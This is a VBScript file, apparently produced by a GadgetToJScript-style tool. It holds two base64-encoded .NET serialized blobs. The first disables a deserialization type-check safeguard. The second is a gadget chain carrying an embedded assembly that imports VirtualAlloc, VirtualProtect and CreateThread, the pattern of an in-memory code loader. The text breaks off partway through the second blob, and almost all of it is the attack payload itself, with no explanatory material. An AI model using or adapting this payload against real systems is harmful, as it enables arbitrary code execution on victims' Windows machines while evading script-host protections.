Function b64Decode(ByVal enc)
    Dim xmlObj, nodeObj
    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
    Set nodeObj = xmlObj.CreateElement("base64")
    nodeObj.dataType = "bin.base64"
    nodeObj.Text = enc
    b64Decode = nodeObj.nodeTypedValue
    Set nodeObj = Nothing
    Set xmlObj = Nothing
End Function

Function Exec()
    
	Dim stage_1, stage_2

    stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
stage_1 = stage_1 & "L3hhbWwvcHJlc2VudGF0aW9uIg0KICAgICAgICAgICAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5m"
stage_1 = stage_1 & "eC8yMDA2L3hhbWwiDQogICAgICAgICAgICB4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiIN"
stage_1 = stage_1 & "CiAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNv"
stage_1 = stage_1 & "bmZpZ3VyYXRpb24iDQogICAgICAgICAgICB4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5"
stage_1 = stage_1 & "PW1zY29ybGliIj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7"
stage_1 = stage_1 & "eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3Zp"
stage_1 = stage_1 & "ZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNv"
stage_1 = stage_1 & "bXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwg"
stage_1 = stage_1 & "Q3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQ"
stage_1 = stage_1 & "cm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9"
stage_1 = stage_1 & "IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0"
stage_1 = stage_1 & "RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFj"
stage_1 = stage_1 & "dGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICAgICAgPHI6Qmlu"
stage_1 = stage_1 & "ZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0"
stage_1 = stage_1 & "aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2Jq"
stage_1 = stage_1 & "ZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2RO"
stage_1 = stage_1 & "YW1lPSJTZXRWYWx1ZSI+DQogICAgICAgICAgICAgICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpCb29sZWFuPnRy"
stage_1 = stage_1 & "dWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgICAgICAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4N"
stage_1 = stage_1 & "CiAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVy"
stage_1 = stage_1 & "IHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0"
stage_1 = stage_1 & "aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICAgICAgICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBh"
stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="

    
    stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMcxAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
stage_2 = stage_2 & "AAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMA"
stage_2 = stage_2 & "AAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1"
stage_2 = stage_2 & "bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25l"
stage_2 = stage_2 & "bnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlh"
stage_2 = stage_2 & "bGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAA"
stage_2 = stage_2 & "AAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkY"
stage_2 = stage_2 & "AAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv"
stage_2 = stage_2 & "bGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyEEhhc2hDb2RlUHJvdmlkZXIISGFzaFNp"
stage_2 = stage_2 & "emUES2V5cwZWYWx1ZXMAAAMDAAUFCwgcU3lzdGVtLkNvbGxlY3Rpb25zLklDb21wYXJlciRTeXN0ZW0uQ29sbGVjdGlvbnMuSUhh"
stage_2 = stage_2 & "c2hDb2RlUHJvdmlkZXII7FE4PwIAAAAKCgMAAAAJHwAAAAkgAAAADw0AAAAAFAAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUg"
stage_2 = stage_2 & "cnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDFBc/aAAAAAAAAAADgACIgCwEwAAAMAAAABgAAAAAAAA4qAAAAIAAA"
stage_2 = stage_2 & "AEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAA"
stage_2 = stage_2 & "AAAAAAC7KQAATwAAAABAAACYAwAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAJCkAADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAABQKAAAAIAAAAAwAAAACAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAgAABgLnJzcmMAAACYAwAAAEAAAAAEAAAADgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAA"
stage_2 = stage_2 & "ABIAAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAA7ykAAAAAAABIAAAAAgAFALAgAAB0CAAAAQAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATMAEAOgAAAAEAABECKA8AAAoAAHIBAABwKBAAAAomfhEA"
stage_2 = stage_2 & "AAoLFgx+EQAACg0giBMAACgSAAAKAHIRAABwKBAAAAomKwAqYiAAEAAAgAEAAAQagAIAAAQfEIADAAAEKgBCU0pCAQABAAAAAAAM"
stage_2 = stage_2 & "AAAAdjQuMC4zMDMxOQAAAAAFAGwAAADUAgAAI34AAEADAADAAwAAI1N0cmluZ3MAAAAAAAcAACAAAAAjVVMAIAcAABAAAAAjR1VJ"
stage_2 = stage_2 & "RAAAADAHAABEAQAAI0Jsb2IAAAAAAAAAAgAAAVcVAhQJAAAAAPoBMwAWAAABAAAAFAAAAAIAAAADAAAABgAAABAAAAASAAAADgAA"
stage_2 = stage_2 & "AAEAAAABAAAABAAAAAEAAAACAAAAAAApAgEAAAAAAAYAWwHNAgYAyAHNAgYAjwCMAg8A7QIAAAYAtwBPAgYAPgFPAgYAHwFPAgYA"
stage_2 = stage_2 & "rwFPAgYAewFPAgYAlAFPAgYAzgBPAgYAowCuAgYAgQCuAgYAAgFPAgYA6QAPAgYAWgNIAgoAqAMfAwoAlgMfAwYAhQJIAgYAYQD+"
stage_2 = stage_2 & "AQAAAAAKAAAAAAABAAEAAQAQAEACswNBAAEAAQARAC8AOAARABMAOAARACIAOABQIAAAAACGGHgCBgABAAAAAACAAJEgQwA7AAEA"
stage_2 = stage_2 & "AAAAAIAAkSBwA0MABQAAAAAAgACRIFsATAAJAAAAAACAAJEgTQNXAA8AliAAAAAAkRh+Al0AEQAAAAEAbAIAAAIA+QEAAAMAcAAA"
stage_2 = stage_2 & "AAQAfwMAAAEANAMAAAIA8gEAAAMAiQMCAAQAYQMAAAEA/AIAAAIA5gEAAAMAPgMAAAQAOgIAAAUADwMAAAYAUAAAAAEAaAAAAAIA"
stage_2 = stage_2 & "nwIJAHgCAQARAHgCBgAZAHgCCgApAHgCEAAxAHgCEAA5AHgCEABBAHgCEABJAHgCEABRAHgCEABZAHgCEABhAHgCFQBpAHgCEABx"
stage_2 = stage_2 & "AHgCEAB5AHgCEACBAHgCBgCJAKMDIQCZAGECJwChAGYCKgAuAAsAYQAuABMAagAuABsAiQAuACMAkgAuACsApAAuADMApAAuADsA"
stage_2 = stage_2 & "pAAuAEMAkgAuAEsAqgAuAFMApAAuAFsApAAuAGMAwgAuAGsA7AAuAHMA+QAaAAEAAAEFAEMAAQAAAQcAcAMBAAABCQBbAAEAAAEL"
stage_2 = stage_2 & "AE0DAQAEgAAAAQAAAAAAAAAAAAAAAACzAwAABAAAAAAAAAAAAAAALwA6AAAAAAAEAAAAAAAAAAAAAAAvAB8DAAAAAAAAAGtlcm5l"
stage_2 = stage_2 & "bDMyADxNb2R1bGU+AFBBR0VfUkVBRFdSSVRFAFBBR0VfRVhFQ1VURQBNRU1fQ09NTUlUAG1zY29ybGliAFZpcnR1YWxBbGxvYwBs"
stage_2 = stage_2 & "cFRocmVhZElkAENyZWF0ZVRocmVhZABoSGFuZGxlAGZsQWxsb2NhdGlvblR5cGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0"
stage_2 = stage_2 & "cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0"
stage_2 = stage_2 & "ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRp"
stage_2 = stage_2 & "b25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFz"
stage_2 = stage_2 & "c2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUA"
stage_2 = stage_2 & "UnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAZHdTdGFja1NpemUAZHdTaXplAHNpemUAU3lzdGVtLlRocmVhZGluZwBTeXN0"
stage_2 = stage_2 & "ZW0uUnVudGltZS5WZXJzaW9uaW5nAFRlc3RBc3NlbWJseS5kbGwAcGFyYW0AUHJvZ3JhbQBTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rp"
stage_2 = stage_2 & "b24AWmVybwBTbGVlcABscFN0YXJ0QWRkcgAuY3RvcgAuY2N0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBkd01pbGxpc2Vj"
stage_2 = stage_2 & "b25kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp"
stage_2 = stage_2 & "bmdNb2RlcwBscFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAGxwQWRkcmVzcwBs"
stage_2 = stage_2 & "cFN0YXJ0QWRkcmVzcwBXYWl0Rm9yU2luZ2xlT2JqZWN0AGxwZmxPbGRQcm90ZWN0AFZpcnR1YWxQcm90ZWN0AGZsUHJvdGVjdABm"
stage_2 = stage_2 & "bE5ld1Byb3RlY3QARGlhbG9nUmVzdWx0AFNob3cATWVzc2FnZUJveABUZXN0QXNzZW1ibHkAAA9TAHQAYQByAHQAIQAhAAALRQBu"
stage_2 = stage_2 & "AGQAIQAhAAAAAACyx6CI9LMHR7bAcE20vr3DAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIGBwQJGAkYBQABEUkOAgYYBAABAQgI"
stage_2 = stage_2 & "t3pcVhk04IkCBgkHAAQYGAkJCQgABAIYCAkQCQoABhgJCRgYCRAJBQACCRgJAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4"
stage_2 = stage_2 & "Y2VwdGlvblRocm93cwEIAQAHAQAAAAARAQAMVGVzdEFzc2VtYmx5AAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDIwAAApAQAk"
stage_2 = stage_2 & "YjJiM2FkYjAtMTY2OS00Yjk0LTg2Y2ItNmRkNjgyZGRiZWEzAAAMAQAHMS4wLjAuMAAARwEAGi5ORVRGcmFtZXdvcmssVmVyc2lv"
stage_2 = stage_2 & "bj12NC4wAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRAuTkVUIEZyYW1ld29yayA0AAAAAAAAALXcpv8AAAAAAgAAAF8AAABcKQAA"
stage_2 = stage_2 & "XAsAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTRPVcj0d9NUCufxmPDDrwOQEAAABEOlx2c19wcm9qZWN0c1xHYWRn"
stage_2 = stage_2 & "ZXRUb0pTY3JpcHRcVGVzdEFzc2VtYmx5XG9ialxEZWJ1Z1xUZXN0QXNzZW1ibHkucGRiAOMpAAAAAAAAAAAAAP0pAAAAIAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAADvKQAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAAA/yUAIAAQAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEA"
stage_2 = stage_2 & "AAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAADwDAAAAAAAAAAAAADwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJ"
stage_2 = stage_2 & "AE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIA"
stage_2 = stage_2 & "RgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAScAgAAAQBTAHQAcgBpAG4AZwBG"
stage_2 = stage_2 & "AGkAbABlAEkAbgBmAG8AAAB4AgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEA"
stage_2 = stage_2 & "QwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAAQgANAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAFQAZQBz"
stage_2 = stage_2 & "AHQAQQBzAHMAZQBtAGIAbAB5AAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAABCABEA"
stage_2 = stage_2 & "AQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAFQAZQBzAHQAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAAAAAEgAEgABAEwAZQBn"
stage_2 = stage_2 & "AGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMAAAACoAAQABAEwAZQBnAGEA"
stage_2 = stage_2 & "bABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAASgARAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAFQAZQBz"
stage_2 = stage_2 & "AHQAQQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAAAAADoADQABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAVABlAHMAdABBAHMA"
stage_2 = stage_2 & "cwBlAG0AYgBsAHkAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBB"
stage_2 = stage_2 & "AHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAgAAAMAAAAEDoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
stage_2 = stage_2 & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABA8AAAAf"
stage_2 = stage_2 & "U3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgMAAAAERGF0YQlVbml0eVR5cGUMQXNzZW1ibHlOYW1lAQABCAYhAAAA/gFT"
stage_2 = stage_2 & "eXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5CeXRlW10sIG1zY29y"
stage_2 = stage_2 & "bGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5"
stage_2 = stage_2 & "c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1Ymxp"
stage_2 = stage_2 & "Y0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGIgAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJl"
stage_2 = stage_2 & "PW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQEAAAAAcAAAAJAwAAAAoJJAAAAAoICAAAAAAKCAgBAAAA"
stage_2 = stage_2 & "AREAAAAPAAAABiUAAAD1AlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lz"
stage_2 = stage_2 & "dGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3Rl"
stage_2 = stage_2 & "bS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2"
stage_2 = stage_2 & "MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
stage_2 = stage_2 & "NWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQEgAAAAcAAAAJBAAAAAoJKAAAAAoICAAAAAAKCAgBAAAAARMAAAAPAAAABikAAADfA1N5"
stage_2 = stage_2 & "c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdl"
stage_2 = stage_2 & "bmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJh"
stage_2 = stage_2 & "bCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVy"
stage_2 = stage_2 & "YXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU"
stage_2 = stage_2 & "b2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBQAAAAHAAAACQUAAAAKCSwAAAAKCAgAAAAACggIAQAAAAEVAAAA"
